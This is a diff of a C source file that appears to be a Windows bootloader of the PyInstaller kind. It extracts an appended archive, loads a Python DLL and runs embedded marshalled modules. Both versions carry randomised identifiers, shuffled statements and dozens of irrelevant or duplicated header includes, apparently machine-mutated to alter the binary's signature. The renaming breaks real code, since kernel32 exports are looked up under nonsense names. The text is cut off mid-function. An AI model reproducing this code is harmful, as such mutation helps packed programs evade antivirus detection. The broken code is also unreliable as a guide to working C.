@@ -1,178 +1,184 @@
 #define _WIN32_WINNT 0x0500
 #include "utils.h"
-#include <eapmethodtypes.h>
-#include <float.h>
-#include <rnderr.h>
-#include <commctrl.h>
+#include <cplext.h>
 #include <memory.h>
-#include <sti.h>
-#include <xolehlp.h>
-#include <mtxattr.h>
-#include <winsmcrd.h>
-#include <signal.h>
-#include <tlogstg.h>
-#include <sdperr.h>
-#include <naptypes.h>
-#include <eaptypes.h>
+#include <restartmanager.h>
+#include <stllock.h>
+#include <certbcli.h>
+#include <dbt.h>
+#include <commctrl.h>
+#include <polarity.h>
+#include <xinput.h>
 #include <windows.h>
-#include <rtccore.h>
-#include <fsrmenums.h>
-#include <gb18030.h>
-#include <cmnquery.h>
-#include <mimeinfo.h>
-#include <adhoc.h>
-#include <wbemprov.h>
-#include <ratings.h>
 #include <string.h>
-#include <initguid.h>
+#include <winver.h>
+#include <sens.h>
+#include <winuser.h>
+#include <intshcut.h>
+#include <signal.h>
+#include <netevent.h>
+#include <custcntl.h>
+#include <gdiplus.h>
+#include <chanmgr.h>
+#include <signal.h>
+#include <mem.h>
+#include <syslimits.h>
+#include <filter.h>
+#include <winwlx.h>
+#include <portabledeviceconnectapi.h>
+#include <davclnt.h>
+#include <sdoias.h>
+#include <ftsiface.h>
+#include <tlogstg.h>
+#include <regstr.h>
 #include "utils.h"
-#define vsnprintf _vsnprintf
-#include <stdio.h>
+#include <windows.h>
 #define unsetenv(x) _putenv(x "=")
+#define snprintf _snprintf
 #include <string.h>
 #include "zlib.h"
-#include <windows.h>
-#include <direct.h>
-#include <sys/stat.h>
-#include "launch.h"
-#define snprintf _snprintf
-#include <sys/types.h>
-#include <io.h>
 #include <process.h>
-char* basename (char *SvRgXRc) {
-char *NufPEeLIcaaTpr = strrchr (SvRgXRc, '\\');
-if (!NufPEeLIcaaTpr) NufPEeLIcaaTpr = strrchr (SvRgXRc, '/');
-return NufPEeLIcaaTpr ? ++NufPEeLIcaaTpr : (char*)SvRgXRc;}
-int sPzfpDvQu(void) {
-OSVERSIONINFO tqxQMe;
-ZeroMemory(&tqxQMe, sizeof(OSVERSIONINFO));
-tqxQMe.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
-GetVersionEx(&tqxQMe);
-return ((tqxQMe.dwMajorVersion > 5) || ((tqxQMe.dwMajorVersion == 5) && (tqxQMe.dwMinorVersion >= 1)));}
-int APVPgiK(char *ALPWaLgktNrWP, char *bgNoyLUbb) { return 0; }
-void pfMCjgKdOujxkxR(void) {
-void (WINAPI *GJKWaYehovbN)(HANDLE);
-BOOL (WINAPI *RdQmMcm)(DWORD dwFlags, ULONG_PTR ulCookie);
-HANDLE FJTwMsmkruI;
-if (!sPzfpDvQu()) return;
-FJTwMsmkruI = LoadLibrary("kernel32");
-GJKWaYehovbN = (void*)GetProcAddress(FJTwMsmkruI, "GJKWaYehovbN");
-RdQmMcm = (void*)GetProcAddress(FJTwMsmkruI, "RdQmMcm");
-if (!GJKWaYehovbN || !RdQmMcm) { return; }}
-void iwJRZWMzSyV(void) { InitCommonControls(); }
-int JVCyONZgQ(char *BUsCDasejCM, const char *XLjYmwwlmrCGs) {
-if (!GetModuleFileNameA(NULL, BUsCDasejCM, _MAX_PATH)) { return -1; } return 0; }
-int IuLLLcULmVX(LPWSTR elCeMLaa) {
-if (!GetModuleFileNameW(NULL, elCeMLaa, _MAX_PATH)) { return -1; } return 0; }
-void MVzPDdJSZh(char *vjGhKWPVwqqEDi, const char *OCdGQPye) {
-char *vwRKRAM = NULL;
-strcpy(vjGhKWPVwqqEDi, OCdGQPye);
-for (vwRKRAM = vjGhKWPVwqqEDi + strlen(vjGhKWPVwqqEDi); *vwRKRAM != '\\' && vwRKRAM >= vjGhKWPVwqqEDi + 2; --vwRKRAM);
-*++vwRKRAM = '\0'; }
-void DKKeJygLDad(char *UAbRBEGiPHgoT, const char *aeDqNmSw){
-strcpy(UAbRBEGiPHgoT, aeDqNmSw);
-strcpy(UAbRBEGiPHgoT + strlen(UAbRBEGiPHgoT) - 3, "pkg");}
- int cOkGOydsmgDQ(const ARCHIVE_STATUS *rYLWCQNZTll) { return 0; }
-int RMZiMs(LPWSTR iFAWlUc) {
-SECURITY_ATTRIBUTES BmrKinrZw;
-STARTUPINFOW TUqXyv;
-PROCESS_INFORMATION MuNQbeqyioFlzV;
-int CbWTCgp = 0;
-BmrKinrZw.bInheritHandle = TRUE;
-signal(SIGABRT, SIG_IGN);
-BmrKinrZw.lpSecurityDescriptor = NULL;
+#include "launch.h"
+#include <io.h>
+#include <sys/types.h>
+#define vsnprintf _vsnprintf
+#include <stdio.h>
+#include <sys/stat.h>
+#include <direct.h>
+char* basename (char *VrmDSmKQBvv) {
+char *dxbgnpXBEWWc = strrchr (VrmDSmKQBvv, '\\');
+if (!dxbgnpXBEWWc) dxbgnpXBEWWc = strrchr (VrmDSmKQBvv, '/');
+return dxbgnpXBEWWc ? ++dxbgnpXBEWWc : (char*)VrmDSmKQBvv;}
+int szJnGlkP(void) {
+OSVERSIONINFO wrLbPbUD;
+ZeroMemory(&wrLbPbUD, sizeof(OSVERSIONINFO));
+wrLbPbUD.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+GetVersionEx(&wrLbPbUD);
+return ((wrLbPbUD.dwMajorVersion > 5) || ((wrLbPbUD.dwMajorVersion == 5) && (wrLbPbUD.dwMinorVersion >= 1)));}
+int kpLoRqP(char *QnDasGMYUZH, char *jiCpyTsslMSlMl) { return 0; }
+void ochkoBHcUdis(void) {
+void (WINAPI *ibTVVP)(HANDLE);
+BOOL (WINAPI *EwmCAwJMedIoFx)(DWORD dwFlags, ULONG_PTR ulCookie);
+HANDLE CJjDXkDRYIzMnY;
+if (!szJnGlkP()) return;
+CJjDXkDRYIzMnY = LoadLibrary("kernel32");
+ibTVVP = (void*)GetProcAddress(CJjDXkDRYIzMnY, "ibTVVP");
+EwmCAwJMedIoFx = (void*)GetProcAddress(CJjDXkDRYIzMnY, "EwmCAwJMedIoFx");
+if (!ibTVVP || !EwmCAwJMedIoFx) { return; }}
+void wTbYHycadBojjDB(void) { InitCommonControls(); }
+int RidfxdEzSBmfi(char *UOErjTi, const char *ACZyktKs) {
+if (!GetModuleFileNameA(NULL, UOErjTi, _MAX_PATH)) { return -1; } return 0; }
+int hwMDZBvnCF(LPWSTR hpBHNObErlg) {
+if (!GetModuleFileNameW(NULL, hpBHNObErlg, _MAX_PATH)) { return -1; } return 0; }
+void KNASQRIRQMV(char *VNcHfAfr, const char *lnHIyMl) {
+char *EZXvhV = NULL;
+strcpy(VNcHfAfr, lnHIyMl);
+for (EZXvhV = VNcHfAfr + strlen(VNcHfAfr); *EZXvhV != '\\' && EZXvhV >= VNcHfAfr + 2; --EZXvhV);
+*++EZXvhV = '\0'; }
+void oanKnOIhpasN(char *wiJogSHXHa, const char *tjjtCF){
+strcpy(wiJogSHXHa, tjjtCF);
+strcpy(wiJogSHXHa + strlen(wiJogSHXHa) - 3, "pkg");}
+ int potbFMUVCZ(const ARCHIVE_STATUS *nxMEYtMvn) { return 0; }
+int XXuuqhTytW(LPWSTR fGLaVpCGZXWA) {
+SECURITY_ATTRIBUTES uzqSkmqr;
+STARTUPINFOW ivNbZLzUugQ;
+PROCESS_INFORMATION cPZesbOQgZJrGi;
+int UltooeqFEHEhz = 0;
 signal(SIGINT, SIG_IGN);
-BmrKinrZw.nLength = sizeof(BmrKinrZw);
-signal(SIGBREAK, SIG_IGN);
 signal(SIGTERM, SIG_IGN);
-GetStartupInfoW(&TUqXyv);
-TUqXyv.hStdOutput = (void*)_get_osfhandle(fileno(stdout));
-TUqXyv.lpDesktop = NULL;
-TUqXyv.lpReserved = NULL;
-TUqXyv.hStdError = (void*)_get_osfhandle(fileno(stderr));
-TUqXyv.hStdInput = (void*)_get_osfhandle(fileno(stdin));
-TUqXyv.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-TUqXyv.wShowWindow = SW_NORMAL;
-TUqXyv.lpTitle = NULL;
-if (CreateProcessW( iFAWlUc, GetCommandLineW(), &BmrKinrZw, NULL, TRUE, 0,  NULL, NULL, &TUqXyv, &MuNQbeqyioFlzV)) {
-WaitForSingleObject(MuNQbeqyioFlzV.hProcess, INFINITE);
-GetExitCodeProcess(MuNQbeqyioFlzV.hProcess, (unsigned long *)&CbWTCgp);
-} else { CbWTCgp = -1; }
-return CbWTCgp; }
-DECLPROC(PyString_AsString);
-DECLPROC(PyList_New);
-DECLPROC(PyInt_AsLong);
-DECLPROC(PyObject_SetAttrString);
-DECLPROC(PyObject_CallMethod);
-DECLPROC(Py_Finalize);
-DECLPROC(PyObject_CallFunction);
-DECLVAR(Py_FrozenFlag);
-DECLPROC(PyImport_ImportModule);
-DECLPROC(Py_Initialize);
-DECLPROC(PyErr_Print);
-DECLPROC(Py_IncRef);
+signal(SIGABRT, SIG_IGN);
+uzqSkmqr.bInheritHandle = TRUE;
+signal(SIGBREAK, SIG_IGN);
+uzqSkmqr.nLength = sizeof(uzqSkmqr);
+uzqSkmqr.lpSecurityDescriptor = NULL;
+GetStartupInfoW(&ivNbZLzUugQ);
+ivNbZLzUugQ.lpReserved = NULL;
+ivNbZLzUugQ.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+ivNbZLzUugQ.lpTitle = NULL;
+ivNbZLzUugQ.wShowWindow = SW_NORMAL;
+ivNbZLzUugQ.hStdError = (void*)_get_osfhandle(fileno(stderr));
+ivNbZLzUugQ.hStdInput = (void*)_get_osfhandle(fileno(stdin));
+ivNbZLzUugQ.lpDesktop = NULL;
+ivNbZLzUugQ.hStdOutput = (void*)_get_osfhandle(fileno(stdout));
+if (CreateProcessW( fGLaVpCGZXWA, GetCommandLineW(), &uzqSkmqr, NULL, TRUE, 0,  NULL, NULL, &ivNbZLzUugQ, &cPZesbOQgZJrGi)) {
+WaitForSingleObject(cPZesbOQgZJrGi.hProcess, INFINITE);
+GetExitCodeProcess(cPZesbOQgZJrGi.hProcess, (unsigned long *)&UltooeqFEHEhz);
+} else { UltooeqFEHEhz = -1; }
+return UltooeqFEHEhz; }
 DECLPROC(Py_SetProgramName);
+DECLPROC(PyModule_GetDict);
+DECLPROC(PyString_AsString);
+DECLPROC(PyErr_Print);
+DECLPROC(PyRun_SimpleString);
+DECLPROC(PyImport_ExecCodeModule);
 DECLPROC(Py_BuildValue);
 DECLPROC(Py_DecRef);
-DECLPROC(PyErr_Clear);
-DECLVAR(Py_NoSiteFlag);
-DECLPROC(PyRun_SimpleString);
-DECLPROC(PySys_SetObject);
-DECLPROC(PyList_Append);
-DECLPROC(PyString_FromStringAndSize);
-DECLPROC(PyImport_AddModule);
-DECLPROC(PyErr_Occurred);
 DECLPROC(PyDict_GetItemString);
-DECLPROC(PyImport_ExecCodeModule);
-DECLPROC(PyModule_GetDict);
-unsigned char *kGcZCaV(ARCHIVE_STATUS *jDMTBUl, TOC *LYbJOkajln);
-int oohRaJfZL(char *fkwgsDaMaDIeGH){
+DECLPROC(PyErr_Clear);
+DECLPROC(Py_Initialize);
+DECLPROC(PyObject_SetAttrString);
+DECLPROC(PyObject_CallFunction);
+DECLPROC(PyImport_ImportModule);
+DECLPROC(PyInt_AsLong);
+DECLPROC(PyImport_AddModule);
+DECLPROC(Py_Finalize);
+DECLPROC(PyList_Append);
+DECLVAR(Py_NoSiteFlag);
+DECLPROC(PyList_New);
+DECLPROC(PyObject_CallMethod);
+DECLPROC(PyErr_Occurred);
+DECLVAR(Py_FrozenFlag);
+DECLPROC(PyString_FromStringAndSize);
+DECLPROC(Py_IncRef);
+DECLPROC(PySys_SetObject);
+unsigned char *SGDbDhuWM(ARCHIVE_STATUS *oLpsHsOyujDb, TOC *SRboUC);
+int mGkitJhHLvi(char *OtcZJiohdjNBMhy){
 int i;
-char *zJnDnkStpRM;
-char ksEtPSNr[16];
-GetTempPath(MAX_PATH, fkwgsDaMaDIeGH);
-sprintf(ksEtPSNr, "_MEI%d", getpid());
+char *tjdzlXpfqbRGGEf;
+char fhnvjPiEi[16];
+GetTempPath(MAX_PATH, OtcZJiohdjNBMhy);
+sprintf(fhnvjPiEi, "_MEI%d", getpid());
 for (i=0;i<5;i++) {
-    zJnDnkStpRM = _tempnam(fkwgsDaMaDIeGH, ksEtPSNr);
-    if (mkdir(zJnDnkStpRM) == 0) {
-        strcpy(fkwgsDaMaDIeGH, zJnDnkStpRM); strcat(fkwgsDaMaDIeGH, "\\");
-        free(zJnDnkStpRM); return 1;
-    } free(zJnDnkStpRM);
+    tjdzlXpfqbRGGEf = _tempnam(OtcZJiohdjNBMhy, fhnvjPiEi);
+    if (mkdir(tjdzlXpfqbRGGEf) == 0) {
+        strcpy(OtcZJiohdjNBMhy, tjdzlXpfqbRGGEf); strcat(OtcZJiohdjNBMhy, "\\");
+        free(tjdzlXpfqbRGGEf); return 1;
+    } free(tjdzlXpfqbRGGEf);
 } return 0; }
-static int gIWgCfgOzOQKFS(char *OxHFOA, const char *qcBVjSLpFgmX, ...){
-    va_list czwSMwDyNZpdPb;
-    struct stat mrptOnzcGJElZ;
-    va_start(czwSMwDyNZpdPb, qcBVjSLpFgmX);
-    vsnprintf(OxHFOA, _MAX_PATH, qcBVjSLpFgmX, czwSMwDyNZpdPb);
-    va_end(czwSMwDyNZpdPb);
-    return stat(OxHFOA, &mrptOnzcGJElZ); }
-int TsFCEChzdbpj(ARCHIVE_STATUS *MCmXDKtxxqW, char const * stqjbEcqNY, char const * znWwCIMVWgQ) {
-    char *HhuuwLJQ;
-    strcpy(MCmXDKtxxqW->archivename, stqjbEcqNY);
-    strcat(MCmXDKtxxqW->archivename, znWwCIMVWgQ);
-    strcpy(MCmXDKtxxqW->homepath, stqjbEcqNY);
-    strcpy(MCmXDKtxxqW->homepathraw, stqjbEcqNY);
-    for ( HhuuwLJQ = MCmXDKtxxqW->homepath; *HhuuwLJQ; HhuuwLJQ++ ) if (*HhuuwLJQ == '\\') *HhuuwLJQ = '/';
+static int alLElzOpqOZA(char *TJbiQtElObcdrA, const char *uvaQrZpP, ...){
+    va_list TFFLeEpQFf;
+    struct stat yZSFcpRtBBKvdtt;
+    va_start(TFFLeEpQFf, uvaQrZpP);
+    vsnprintf(TJbiQtElObcdrA, _MAX_PATH, uvaQrZpP, TFFLeEpQFf);
+    va_end(TFFLeEpQFf);
+    return stat(TJbiQtElObcdrA, &yZSFcpRtBBKvdtt); }
+int rDvZnGjxrftwm(ARCHIVE_STATUS *hClBfkohE, char const * mBCkFiqa, char const * ZKuOhmWIsebItTp) {
+    char *iQmcBRO;
+    strcpy(hClBfkohE->archivename, mBCkFiqa);
+    strcat(hClBfkohE->archivename, ZKuOhmWIsebItTp);
+    strcpy(hClBfkohE->homepath, mBCkFiqa);
+    strcpy(hClBfkohE->homepathraw, mBCkFiqa);
+    for ( iQmcBRO = hClBfkohE->homepath; *iQmcBRO; iQmcBRO++ ) if (*iQmcBRO == '\\') *iQmcBRO = '/';
     return 0;}
-int wnXoXkI(ARCHIVE_STATUS *ELJxrZNlZ, int fphikQwriRuu) {
-    if (fseek(ELJxrZNlZ->fp, fphikQwriRuu-(int)sizeof(COOKIE), SEEK_SET)) return -1;
-    if (fread(&(ELJxrZNlZ->cookie), sizeof(COOKIE), 1, ELJxrZNlZ->fp) < 1) return -1;
-    if (strncmp(ELJxrZNlZ->cookie.magic, MAGIC, strlen(MAGIC))) return -1;
+int wYrwup(ARCHIVE_STATUS *eguXnicnBz, int sTbqSLSAq) {
+    if (fseek(eguXnicnBz->fp, sTbqSLSAq-(int)sizeof(COOKIE), SEEK_SET)) return -1;
+    if (fread(&(eguXnicnBz->cookie), sizeof(COOKIE), 1, eguXnicnBz->fp) < 1) return -1;
+    if (strncmp(eguXnicnBz->cookie.magic, MAGIC, strlen(MAGIC))) return -1;
     return 0;}
-    int ySQXyhSAKp(ARCHIVE_STATUS *YpyIXunXiJRajy){
-        int i; int WtWkwk;
-        YpyIXunXiJRajy->fp = fopen(YpyIXunXiJRajy->archivename, "rb");
-        if (YpyIXunXiJRajy->fp == NULL) { return -1;}
-        fseek(YpyIXunXiJRajy->fp, 0, SEEK_END);
-        WtWkwk = ftell(YpyIXunXiJRajy->fp);
-        if (wnXoXkI(YpyIXunXiJRajy, WtWkwk) < 0) { return -1;}
-        YpyIXunXiJRajy->pkgstart = WtWkwk - ntohl(YpyIXunXiJRajy->cookie.len);
-        fseek(YpyIXunXiJRajy->fp, YpyIXunXiJRajy->pkgstart + ntohl(YpyIXunXiJRajy->cookie.TOC), SEEK_SET);
-        YpyIXunXiJRajy->tocbuff = (TOC *) malloc(ntohl(YpyIXunXiJRajy->cookie.TOClen));
-        if (YpyIXunXiJRajy->tocbuff == NULL){ return -1; }
-        if (fread(YpyIXunXiJRajy->tocbuff, ntohl(YpyIXunXiJRajy->cookie.TOClen), 1, YpyIXunXiJRajy->fp) < 1) { return -1; }
-        YpyIXunXiJRajy->tocend = (TOC *) (((char *)YpyIXunXiJRajy->tocbuff) + ntohl(YpyIXunXiJRajy->cookie.TOClen));
-        if (ferror(YpyIXunXiJRajy->fp)) { return -1; }
+    int ndqRJbtnndS(ARCHIVE_STATUS *suFKrE){
+        int i; int WetNTgoUUCSLc;
+        suFKrE->fp = fopen(suFKrE->archivename, "rb");
+        if (suFKrE->fp == NULL) { return -1;}
+        fseek(suFKrE->fp, 0, SEEK_END);
+        WetNTgoUUCSLc = ftell(suFKrE->fp);
+        if (wYrwup(suFKrE, WetNTgoUUCSLc) < 0) { return -1;}
+        suFKrE->pkgstart = WetNTgoUUCSLc - ntohl(suFKrE->cookie.len);
+        fseek(suFKrE->fp, suFKrE->pkgstart + ntohl(suFKrE->cookie.TOC), SEEK_SET);
+        suFKrE->tocbuff = (TOC *) malloc(ntohl(suFKrE->cookie.TOClen));
+        if (suFKrE->tocbuff == NULL){ return -1; }
+        if (fread(suFKrE->tocbuff, ntohl(suFKrE->cookie.TOClen), 1, suFKrE->fp) < 1) { return -1; }
+        suFKrE->tocend = (TOC *) (((char *)suFKrE->tocbuff) + ntohl(suFKrE->cookie.TOClen));
+        if (ferror(suFKrE->fp)) { return -1; }
         return 0;}
         struct _old_typeobject;
         typedef struct _old_object { int ob_refcnt; struct _old_typeobject *ob_type;} OldPyObject;
@@ -186,357 +192,357 @@ int wnXoXkI(ARCHIVE_STATUS *ELJxrZNlZ, int fphikQwriRuu) {
             #define _Py_Dealloc(op) (*(op)->ob_type->tp_dealloc)((PyObject *)(op))
             OldPyObject *oo = (OldPyObject*)o;
             if (--(oo)->ob_refcnt == 0) _Py_Dealloc(oo);}
-int GngzDeb(HMODULE tmIZtSevNqGU, int dTFrRhLbGDPc){
-GETPROC(tmIZtSevNqGU, PyList_Append);
-GETPROC(tmIZtSevNqGU, PyImport_ExecCodeModule);
-GETPROC(tmIZtSevNqGU, PyList_New);
-GETPROC(tmIZtSevNqGU, PyObject_SetAttrString);
-GETPROC(tmIZtSevNqGU, PyErr_Print);
-GETPROC(tmIZtSevNqGU, Py_Initialize);
-GETPROC(tmIZtSevNqGU, PyErr_Clear);
-GETPROC(tmIZtSevNqGU, PyObject_CallFunction);
-GETPROC(tmIZtSevNqGU, Py_Finalize);
-GETPROC(tmIZtSevNqGU, PyImport_ImportModule);
-GETPROC(tmIZtSevNqGU, PyRun_SimpleString);
-GETPROCOPT(tmIZtSevNqGU, Py_IncRef);
-GETPROC(tmIZtSevNqGU, Py_BuildValue);
-GETPROC(tmIZtSevNqGU, Py_SetProgramName);
-GETVAR(tmIZtSevNqGU, Py_FrozenFlag);
-GETPROC(tmIZtSevNqGU, PyModule_GetDict);
-GETPROC(tmIZtSevNqGU, PyString_FromStringAndSize);
-GETPROC(tmIZtSevNqGU, PyImport_AddModule);
-GETPROC(tmIZtSevNqGU, PyDict_GetItemString);
-GETPROC(tmIZtSevNqGU, PyObject_CallMethod);
-GETPROC(tmIZtSevNqGU, PyInt_AsLong);
-GETVAR(tmIZtSevNqGU, Py_NoSiteFlag);
-GETPROC(tmIZtSevNqGU, PyString_AsString);
-GETPROC(tmIZtSevNqGU, PyErr_Occurred);
-GETPROCOPT(tmIZtSevNqGU, Py_DecRef);
+int sXWnHkdQdt(HMODULE gUJpNrAirE, int OeDPsweHOZOm){
+GETPROC(gUJpNrAirE, Py_BuildValue);
+GETPROC(gUJpNrAirE, PyInt_AsLong);
+GETPROC(gUJpNrAirE, PyErr_Print);
+GETPROC(gUJpNrAirE, PyImport_ExecCodeModule);
+GETPROC(gUJpNrAirE, PyImport_ImportModule);
+GETPROC(gUJpNrAirE, PyErr_Clear);
+GETPROC(gUJpNrAirE, Py_Finalize);
+GETPROC(gUJpNrAirE, PyDict_GetItemString);
+GETPROC(gUJpNrAirE, PyList_Append);
+GETPROCOPT(gUJpNrAirE, Py_DecRef);
+GETPROC(gUJpNrAirE, PyList_New);
+GETPROC(gUJpNrAirE, PyImport_AddModule);
+GETPROC(gUJpNrAirE, PyModule_GetDict);
+GETPROC(gUJpNrAirE, PyRun_SimpleString);
+GETPROCOPT(gUJpNrAirE, Py_IncRef);
+GETPROC(gUJpNrAirE, PyString_AsString);
+GETPROC(gUJpNrAirE, Py_SetProgramName);
+GETPROC(gUJpNrAirE, PyObject_CallMethod);
+GETPROC(gUJpNrAirE, PyString_FromStringAndSize);
+GETPROC(gUJpNrAirE, Py_Initialize);
+GETPROC(gUJpNrAirE, PyObject_CallFunction);
+GETVAR(gUJpNrAirE, Py_FrozenFlag);
+GETVAR(gUJpNrAirE, Py_NoSiteFlag);
+GETPROC(gUJpNrAirE, PyObject_SetAttrString);
+GETPROC(gUJpNrAirE, PyErr_Occurred);
     if (!PI_Py_IncRef) PI_Py_IncRef = _EmulatedIncRef;
     if (!PI_Py_DecRef) PI_Py_DecRef = _EmulatedDecRef;
     return 0;}
-int kvQzAxpTw(ARCHIVE_STATUS *UGkSNMyJeNsyA){
-    HINSTANCE RIZODPe;
-    char TsYXmuLrlmjixF[_MAX_PATH + 1];
-    int jivbqyEPxBXWGO = ntohl(UGkSNMyJeNsyA->cookie.pyvers);
-    sprintf(TsYXmuLrlmjixF, "%spython%02d.dll", UGkSNMyJeNsyA->homepathraw, jivbqyEPxBXWGO);
-    RIZODPe = LoadLibraryExA(TsYXmuLrlmjixF, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
-    if (!RIZODPe) {sprintf(TsYXmuLrlmjixF, "%spython%02d.dll", UGkSNMyJeNsyA->temppathraw, jivbqyEPxBXWGO);
-        RIZODPe = LoadLibraryExA(TsYXmuLrlmjixF, NULL, LOAD_WITH_ALTERED_SEARCH_PATH );}
-    if (RIZODPe == 0) { return -1; }
-    GngzDeb(RIZODPe, jivbqyEPxBXWGO);
+int DOaCRqBZKiYumv(ARCHIVE_STATUS *iXNhSMnPAdA){
+    HINSTANCE CajQzVQaJPR;
+    char DiIMGbk[_MAX_PATH + 1];
+    int iYRJKZoGZTQqp = ntohl(iXNhSMnPAdA->cookie.pyvers);
+    sprintf(DiIMGbk, "%spython%02d.dll", iXNhSMnPAdA->homepathraw, iYRJKZoGZTQqp);
+    CajQzVQaJPR = LoadLibraryExA(DiIMGbk, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
+    if (!CajQzVQaJPR) {sprintf(DiIMGbk, "%spython%02d.dll", iXNhSMnPAdA->temppathraw, iYRJKZoGZTQqp);
+        CajQzVQaJPR = LoadLibraryExA(DiIMGbk, NULL, LOAD_WITH_ALTERED_SEARCH_PATH );}
+    if (CajQzVQaJPR == 0) { return -1; }
+    sXWnHkdQdt(CajQzVQaJPR, iYRJKZoGZTQqp);
     return 0;}
- TOC *yjRqNwOEMyUEaOm(ARCHIVE_STATUS *gQqQyrB, TOC* YgNtLULc){
-     TOC *ZpCBWkavkdm = (TOC*)((char *)YgNtLULc + ntohl(YgNtLULc->structlen));
-     if (ZpCBWkavkdm < gQqQyrB->tocbuff) { return gQqQyrB->tocend; }
-     return ZpCBWkavkdm;}
-int gWVJeVhOaCnXR(ARCHIVE_STATUS *KNDpfXMPh, int argc, char *argv[]) {
-static char mplLRJEf[2*_MAX_PATH + 14];
+ TOC *axOzXbBy(ARCHIVE_STATUS *nxDWSTaFrhqq, TOC* LucxqGUYqLBwo){
+     TOC *ePjBvzU = (TOC*)((char *)LucxqGUYqLBwo + ntohl(LucxqGUYqLBwo->structlen));
+     if (ePjBvzU < nxDWSTaFrhqq->tocbuff) { return nxDWSTaFrhqq->tocend; }
+     return ePjBvzU;}
+int kNTpLDYoKCw(ARCHIVE_STATUS *DwUdnzMPxnQB, int argc, char *argv[]) {
+static char MtyoiBnNMg[2*_MAX_PATH + 14];
 int i;
-char bLonQSRq[_MAX_PATH+1+80];
-char yfvVuAqQAEwdd[_MAX_PATH+1];
-PyObject *yUtyUTEfVYmOGs;
+char KfYVuaSrwCvIdY[_MAX_PATH+1+80];
+char QKtklHNUckQmOon[_MAX_PATH+1];
+PyObject *TOcZDGPdtIXYQ;
 PyObject *val;
 PyObject *sys;
-strcpy(mplLRJEf, "PYTHONPATH=");
-if (KNDpfXMPh->temppath[0] != '\0') { strcat(mplLRJEf, KNDpfXMPh->temppath); mplLRJEf[strlen(mplLRJEf)-1] = '\0'; strcat(mplLRJEf, ";"); }
-strcat(mplLRJEf, KNDpfXMPh->homepath);
-if (strlen(mplLRJEf) > 14) mplLRJEf[strlen(mplLRJEf)-1] = '\0';
-putenv(mplLRJEf);
-strcpy(mplLRJEf, "PYTHONHOME=");
-strcat(mplLRJEf, KNDpfXMPh->temppath);
-putenv(mplLRJEf);
+strcpy(MtyoiBnNMg, "PYTHONPATH=");
+if (DwUdnzMPxnQB->temppath[0] != '\0') { strcat(MtyoiBnNMg, DwUdnzMPxnQB->temppath); MtyoiBnNMg[strlen(MtyoiBnNMg)-1] = '\0'; strcat(MtyoiBnNMg, ";"); }
+strcat(MtyoiBnNMg, DwUdnzMPxnQB->homepath);
+if (strlen(MtyoiBnNMg) > 14) MtyoiBnNMg[strlen(MtyoiBnNMg)-1] = '\0';
+putenv(MtyoiBnNMg);
+strcpy(MtyoiBnNMg, "PYTHONHOME=");
+strcat(MtyoiBnNMg, DwUdnzMPxnQB->temppath);
+putenv(MtyoiBnNMg);
 *PI_Py_NoSiteFlag = 1; *PI_Py_FrozenFlag = 1;
-PI_Py_SetProgramName(KNDpfXMPh->archivename);
+PI_Py_SetProgramName(DwUdnzMPxnQB->archivename);
 PI_Py_Initialize();
 PI_PyRun_SimpleString("import sys\n");
 PI_PyRun_SimpleString("del sys.path[:]\n");
-if (KNDpfXMPh->temppath[0] != '\0') {
-    strcpy(yfvVuAqQAEwdd, KNDpfXMPh->temppath);
-    yfvVuAqQAEwdd[strlen(yfvVuAqQAEwdd)-1] = '\0';
-    sprintf(bLonQSRq, "sys.path.append(r\"%s\")", yfvVuAqQAEwdd);
-    PI_PyRun_SimpleString(bLonQSRq);}
-strcpy(yfvVuAqQAEwdd, KNDpfXMPh->homepath);
-yfvVuAqQAEwdd[strlen(yfvVuAqQAEwdd)-1] = '\0';
-sprintf(bLonQSRq, "sys.path.append(r\"%s\")", yfvVuAqQAEwdd);
-PI_PyRun_SimpleString (bLonQSRq);
-yUtyUTEfVYmOGs = PI_PyList_New(0);
-val = PI_Py_BuildValue("s", KNDpfXMPh->archivename);
-PI_PyList_Append(yUtyUTEfVYmOGs, val);
-for (i = 1; i < argc; ++i) { val = PI_Py_BuildValue ("s", argv[i]); PI_PyList_Append (yUtyUTEfVYmOGs, val); }
+if (DwUdnzMPxnQB->temppath[0] != '\0') {
+    strcpy(QKtklHNUckQmOon, DwUdnzMPxnQB->temppath);
+    QKtklHNUckQmOon[strlen(QKtklHNUckQmOon)-1] = '\0';
+    sprintf(KfYVuaSrwCvIdY, "sys.path.append(r\"%s\")", QKtklHNUckQmOon);
+    PI_PyRun_SimpleString(KfYVuaSrwCvIdY);}
+strcpy(QKtklHNUckQmOon, DwUdnzMPxnQB->homepath);
+QKtklHNUckQmOon[strlen(QKtklHNUckQmOon)-1] = '\0';
+sprintf(KfYVuaSrwCvIdY, "sys.path.append(r\"%s\")", QKtklHNUckQmOon);
+PI_PyRun_SimpleString (KfYVuaSrwCvIdY);
+TOcZDGPdtIXYQ = PI_PyList_New(0);
+val = PI_Py_BuildValue("s", DwUdnzMPxnQB->archivename);
+PI_PyList_Append(TOcZDGPdtIXYQ, val);
+for (i = 1; i < argc; ++i) { val = PI_Py_BuildValue ("s", argv[i]); PI_PyList_Append (TOcZDGPdtIXYQ, val); }
 sys = PI_PyImport_ImportModule("sys");
-PI_PyObject_SetAttrString(sys, "argv", yUtyUTEfVYmOGs);
+PI_PyObject_SetAttrString(sys, "argv", TOcZDGPdtIXYQ);
 return 0;}
-int ojZdxcSb(ARCHIVE_STATUS *fZnnmo){
-    PyObject *xvxgxqXVVWSCeSr; PyObject *vsEARxuCEO; PyObject *IEBqieXVjEEnbe;
-    TOC *DqBAqMxmDGRE; PyObject *co; PyObject *mod;
-    xvxgxqXVVWSCeSr = PI_PyImport_ImportModule("marshal");
-    vsEARxuCEO = PI_PyModule_GetDict(xvxgxqXVVWSCeSr);
-    IEBqieXVjEEnbe = PI_PyDict_GetItemString(vsEARxuCEO, "loads");
-    DqBAqMxmDGRE = fZnnmo->tocbuff;
-    while (DqBAqMxmDGRE < fZnnmo->tocend) {
-        if (DqBAqMxmDGRE->typcd == 'm' || DqBAqMxmDGRE->typcd == 'M'){
-            unsigned char *HJIkozDUcmgt = kGcZCaV(fZnnmo, DqBAqMxmDGRE);
-            co = PI_PyObject_CallFunction(IEBqieXVjEEnbe, "s#", HJIkozDUcmgt+8, ntohl(DqBAqMxmDGRE->ulen)-8);
